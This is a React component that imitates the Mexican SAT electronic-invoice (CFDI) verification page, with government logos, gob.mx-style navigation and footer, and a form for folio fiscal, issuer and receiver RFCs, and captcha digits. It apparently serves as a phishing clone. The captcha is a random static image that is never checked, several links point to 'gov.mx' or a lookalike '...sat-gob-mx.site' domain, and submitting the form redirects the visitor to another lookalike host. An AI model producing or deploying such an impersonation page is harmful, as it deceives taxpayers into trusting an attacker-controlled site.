import React, {useEffect, useState} from 'react';

interface FormData {
    uuid: string;
    rfcEmisor: string;
    rfcReceptor: string;
    captchaNumbers: string;
}

interface ErrorState {
    uuid: boolean;
    rfcEmisor: boolean;
    rfcReceptor: boolean;
    captchaNumbers: boolean;
}

const imagenes = [
    '/images/GeneraCaptcha.jpeg',
    '/images/GeneraCaptcha2.jpeg',
    '/images/GeneraCaptcha3.jpeg',
    '/images/GeneraCaptcha4.jpeg',
    '/images/GeneraCaptcha5.jpeg',
    '/images/GeneraCaptcha6.jpeg'
];

const CFDIForm: React.FC = () => {

    const [formData, setFormData] = useState<FormData>({
        uuid: '',
        rfcEmisor: '',
        rfcReceptor: '',
        captchaNumbers: ''
    });

    const [errors, setErrors] = useState<ErrorState>({
        uuid: false,
        rfcEmisor: false,
        rfcReceptor: false,
        captchaNumbers: false
    });

    const [captchaImage, setCaptchaImage] = useState<string>('');

    useEffect(() => {
        mostrarImagenAleatoria();
    }, []);

    const mostrarImagenAleatoria = () => {
        const indiceAleatorio = Math.floor(Math.random() * imagenes.length);
        setCaptchaImage(imagenes[indiceAleatorio]);
    };

    const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const {name, value} = e.target;

        if (name === 'uuid') {
            //const formattedValue = formatAsGUID(value);
            updateFormData(name, value);
            return;
        } else {
            updateFormData(name, value);
        }
    };

    const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
        const key = e.key;
        //const value = e.currentTarget.value;
        const input = e.currentTarget;
        const cursorIndex = input.selectionStart ?? 0;

        /*console.log(cursorIndex);
        console.log(e.currentTarget.value, key);
        console.log(`Key pressed: ${key}, Current value: ${value}`);*/

        if (!/^[A-Fa-f0-9]$/.test(key) && key !== 'Backspace') {
            e.preventDefault();
        } else {
            /*
            const splitArray = value.split('-').map((part: string) => part.replace(/_/g, ''));
            console.log(splitArray);

            const parts = [8, 4, 4, 4, 12];

            let result = '';
            let len = 0;

            for (let i = 0; i < parts.length; i++) {
                if (i > 0) {
                    result += '-';
                }
                if (i < splitArray.length) {

                    len += parts[i];

                    console.log(cursorIndex);

                    if (cursorIndex <= len) {
                        const part = splitArray[i].substring(0, cursorIndex) + key + splitArray[i].substring(cursorIndex + 1, parts[i]).padEnd(parts[i], '_');
                        result += part;
                        console.log(result);
                    }
                }
            }

            e.currentTarget.value = result;
            */
        }

        //e.currentTarget.focus();
        e.currentTarget.setSelectionRange(cursorIndex, cursorIndex);
    }

    /*
    function formatAsGUID(input: string): string {
        // Remove any non-hex characters
        const clean = input.replace(/[^A-Fa-f0-9]/g, '');

        // Define how many characters per group
        const parts = [8, 4, 4, 4, 12];

        let result = '';
        let index = 0;

        for (let i = 0; i < parts.length; i++) {
            if (i > 0) result += '-';
            const part = clean.substr(index, parts[i]).padEnd(parts[i], '_');
            result += part;
            index += parts[i];
        }

        return result;
    }
    */

    const updateFormData = (name: string, value: string) => {
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));
        validateField(name, value);
    }

    const validateField = (name: string, value: string) => {
        let isValid = true;
        if (!value.trim()) {
            isValid = false;
        }
        if (name === 'uuid' && value === '________-____-____-____-____________') {
            isValid = false;
        }
        setErrors(prev => ({
            ...prev,
            [name]: !isValid
        }));
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        const isValid = Object.values(errors).every(error => !error);
        if (isValid) {
            window.location.href = 'https://verificacfdi-facturaelectronica.com.mx/default.aspx/2--.html';
        }
    };

    return (
        <div>
            <header>
                <nav className="navbar navbar-inverse navbar-fixed-top" role="navigation">
                    <div className="container">
                        <div className="navbar-header">
                            <button type="button" className="navbar-toggle collapsed" data-toggle="collapse"
                                    data-target="#navbarMainCollapse">
                                <span className="sr-only">Interruptor de Navegación</span>
                                <span className="icon-bar"></span>
                                <span className="icon-bar"></span>
                                <span className="icon-bar"></span>
                            </button>
                            <a className="navbar-brand pl-1.5" href="https://www.gov.mx/">
                                <img alt="Logo SHCP" src="/images/gobmxlogo.svg" width="75" height="23"/>
                            </a>
                        </div>
                        <div className="collapse navbar-collapse" id="navbarMainCollapse">
                            <ul className="nav navbar-nav navbar-right">
                                <li>
                                    <a href="https://www.gov.mx/tramites">
                                        <div className="font-calibri text-[14pt] tracking-wider font-light">
                                            Trámites
                                        </div>
                                    </a>
                                </li>
                                <li>
                                    <a href="https://www.gov.mx/gobierno">
                                        <div className="font-calibri text-[14pt] tracking-wider font-light">
                                            Gobierno
                                        </div>
                                    </a>
                                </li>
                                <li>
                                    <a href="https://www.gov.mx/busqueda">
                                        <span className="sr-only">Búsqueda</span>
                                        <img src="/images/lupa.png" alt="Busqueda"/>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </nav>
            </header>

            <form onSubmit={handleSubmit} className="form-horizontal" role="form">
                <main role="main">
                    <div id="cuerpo_principal" className="row">
                        <div id="encabezado" className="row">
                            <div id="encabezadoPortal">
                                <nav className="navbar navbar-inverse sub-navbar navbar-fixed-top">
                                    <div className="container">
                                        <div className="navbar-header">
                                            <button type="button" className="navbar-toggle collapsed"
                                                    data-toggle="collapse" data-target="#subenlaces">
                                                <span className="sr-only">Interruptor de Navegación</span>
                                                <span className="icon-bar"></span>
                                                <span className="icon-bar"></span>
                                                <span className="icon-bar"></span>
                                            </button>
                                            <a className="navbar-brand"
                                               href="https://verificacfdi-facturaelectronica-sat-gob-mx.site/">
                                                <div className="factura">
                                                    Factura electrónica
                                                </div>
                                            </a>
                                        </div>
                                    </div>
                                </nav>
                            </div>
                        </div>

                        <div id="cuerpo" className="container top-buffer-submenu">
                            <div className="container">
                                <div className="row">
                                    <ol className="breadcrumb">
                                        <li>
                                            <a href="http://www.gov.mx/">
                                                <img src="/images/home.png" width="13" height="12" alt="Home"/>
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#">&nbsp;&gt;&nbsp;Inicio</a>
                                        </li>
                                    </ol>
                                </div>
                                <div className="row">
                                    <img src="/images/Logo_SHCP_SAT-.jpg" alt="Logo SHCP"/>
                                </div>
                                <div className="row">
                                    <h3 className="titulo">Verificación de comprobantes fiscales digitales por
                                        internet</h3>
                                </div>
                                <hr className="red"/>
                            </div>

                            <label className="control-label">A través de esta opción, usted podrá verificar si el
                                comprobante fue certificado por el SAT</label>
                            <br/><br/>

                            <div className="row form-group">
                                <div className="col-md-4">
                                    <span className="control-label">Folio fiscal</span>
                                    <span className="form-text">*</span>:
                                    <input
                                        name="uuid"
                                        type="text"
                                        value={formData.uuid}
                                        maxLength={36}
                                        className="form-control uppercase mascara"
                                        onChange={handleInputChange}
                                        onKeyDown={handleKeyDown}
                                    />
                                    {errors.uuid && (
                                        <small className="form-text form-text-error">Este campo es obligatorio</small>
                                    )}
                                </div>
                                <div className="col-md-4">
                                    <span className="control-label">RFC emisor</span>
                                    <span className="form-text">*</span>:
                                    <input
                                        name="rfcEmisor"
                                        type="text"
                                        value={formData.rfcEmisor}
                                        maxLength={13}
                                        className="form-control uppercase"
                                        onChange={handleInputChange}
                                    />
                                    {errors.rfcEmisor && (
                                        <small className="form-text form-text-error">Este campo es obligatorio</small>
                                    )}
                                </div>
                                <div className="col-md-4">
                                    <span className="control-label">RFC receptor</span>
                                    <span className="form-text">*</span>:
                                    <input
                                        name="rfcReceptor"
                                        type="text"
                                        value={formData.rfcReceptor}
                                        maxLength={13}
                                        className="form-control uppercase"
                                        onChange={handleInputChange}
                                    />
                                    {errors.rfcReceptor && (
                                        <small className="form-text form-text-error">Este campo es obligatorio</small>
                                    )}
                                </div>
                            </div>

                            <div className="row form-group">
                                <div className="col-md-4">
                                    <div className="captcha">
                                        <img src={captchaImage} width="150" height="100" alt="Captcha"/>
                                    </div>
                                </div>
                                <div className="col-md-4">
                                    <span className="control-label">Proporcione los dígitos de la imagen</span>
                                    <span className="form-text">*</span>:
                                    <input
                                        name="captchaNumbers"
                                        type="text"
                                        maxLength={5}
                                        className="form-control"
                                        onChange={handleInputChange}
                                    />
                                    {errors.captchaNumbers && (
                                        <small className="form-text form-text-error">Este campo es obligatorio</small>
                                    )}
                                </div>
                                <div className="col-md-4" style={{
                                    paddingRight: '13px',
                                }}>
                                    <br/>
                                    <button type="submit" className="btn btn-primary pull-right">
                                        Verificar CFDI
                                    </button>
                                </div>
                            </div>

                            <div className="col-md-12 form-group">
                                <div className="col-md-8 pull-left text-muted text-vertical-align-button" style={{
                                    marginLeft: '-2px',
                                }}>
                                    * Datos obligatorios
                                </div>
                            </div>
                        </div>
                    </div>
                </main>

                <footer className="main-footer noPrint">
                    <div className="list-info footer-container">
                        <div className="container">
                            <div className="row">
                                <div className="col-sm-3 footer-img">
                                    <img width="100%" src="/images/logofooter.svg" alt="Logo Footer"/>
                                </div>
                                <div className="col-sm-3 parrafo-enlaces">
                                    <div className="font-calibri text-[16pt] tracking-wider font-light">
                                        <h5>Enlaces</h5>
                                    </div>
                                    <ul>
                                        <li><a href="http://www.participa.gob.mx/" className="text-decoration-none">
                                            <div
                                                className="font-calibri text-[11pt] tracking-wider font-normal">Participa
                                            </div>
                                        </a></li>
                                        <li><a href="https://www.gob.mx/publicaciones" className="text-decoration-none">
                                            <div
                                                className="font-calibri text-[11pt] tracking-wider font-normal">Publicaciones
                                                Oficiales
                                            </div>
                                        </a></li>
                                        <li><a href="http://www.ordenjuridico.gob.mx/" className="text-decoration-none">
                                            <div className="font-calibri text-[11pt] tracking-wider font-normal">Marco
                                                Jurídico
                                            </div>
                                        </a></li>
                                        <li><a href="https://consultapublicamx.inai.org.mx/vut-web/" target="_blank"
                                               className="text-decoration-none">
                                            <div
                                                className="font-calibri text-[11pt] tracking-wider font-normal">Plataforma
                                                Nacional de<br/>Transparencia
                                            </div>
                                        </a></li>
                                    </ul>
                                </div>
                                <div className="col-sm-3 parrafo-enlaces">
                                    <div className="font-arial text-[18pt] tracking-wider font-normal">
                                        <h5>¿Qué es gob.mx?</h5>
                                    </div>
                                    <p className="font-calibri text-[11pt] leading-6 tracking-wider font-normal">Es el
                                        portal único de trámites,<br/>información y participación<br/>cuidadana. <a
                                            href="https://www.gob.mx/que-es-gobmx" className="text-decoration-none">Leer
                                            más</a></p>
                                    <ul>
                                        <li><a href="https://datos.gob.mx/" className="text-decoration-none">
                                            <div className="font-calibri text-[11pt] tracking-wider font-normal">Portal
                                                de datos abiertos
                                            </div>
                                        </a></li>
                                        <li><a href="https://www.gob.mx/accesibilidad" className="text-decoration-none">
                                            <div
                                                className="font-calibri text-[11pt] tracking-wider font-normal">Declaración
                                                de accesibilidad
                                            </div>
                                        </a></li>
                                        <li><a href="https://www.gob.mx/privacidadintegral" target="_blank"
                                               className="text-decoration-none">
                                            <div className="font-calibri text-[11pt] tracking-wider font-normal">Aviso
                                                de privacidad integral
                                            </div>
                                        </a></li>
                                        <li><a href="https://www.gob.mx/privacidadsimplificado" target="_blank"
                                               className="text-decoration-none">
                                            <div className="font-calibri text-[11pt] tracking-wider font-normal">Aviso
                                                de privacidad simplificado
                                            </div>
                                        </a></li>
                                        <li><a href="https://www.gob.mx/terminos#medidas-seguridad-informacion"
                                               target="_blank" className="text-decoration-none">
                                            <div
                                                className="font-calibri text-[11pt] tracking-wider font-normal">Términos
                                                y condiciones
                                            </div>
                                        </a></li>
                                        <li><a href="https://www.gob.mx/terminos#medidas-seguridad-informacion"
                                               target="_blank" className="text-decoration-none">
                                            <div
                                                className="font-calibri text-[11pt] tracking-wider font-normal">Política
                                                de seguridad
                                            </div>
                                        </a></li>
                                        <li><a href="https://www.gob.mx/sitemap" target="_blank"
                                               className="text-decoration-none">
                                            <div className="font-calibri text-[11pt] tracking-wider font-normal">Mapa de
                                                sitio
                                            </div>
                                        </a></li>
                                    </ul>
                                </div>
                                <div className="col-sm-3 parrafo-titulo">
                                    <p className="font-arial text-[18pt] leading-8 tracking-wider font-light">
                                        <a href="https://www.gob.mx/tramites/ficha/presentacion-de-quejas-y-denuncias-en-la-sfp/SFP54"
                                           className="text-decoration-none" style={{fontSize: "15px"}}>Denuncia contra
                                            servidores
                                            públicos</a>
                                    </p>
                                    <div className="font-arial text-[18pt] tracking-wider font-light">
                                        <h5>Síguenos en</h5>
                                    </div>
                                    <ul className="list-inline">
                                        <li><a href="https://www.facebook.com/govmx" target="_blank"
                                               aria-label="Facebook de presidencia"><img src="/images/facebook.png"
                                                                                         width="19" height="24"
                                                                                         alt="Facebook"/></a></li>
                                        <li><a href="https://twitter.com/govmx" target="_blank"
                                               aria-label="Twitter de presidencia"><img src="/images/twitter.png"
                                                                                        width="24" height="24"
                                                                                        alt="Twitter"/></a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                    <img src="/images/pleca.svg" alt="Pleca"/>
                </footer>
            </form>
        </div>
    );
};

export default CFDIForm;
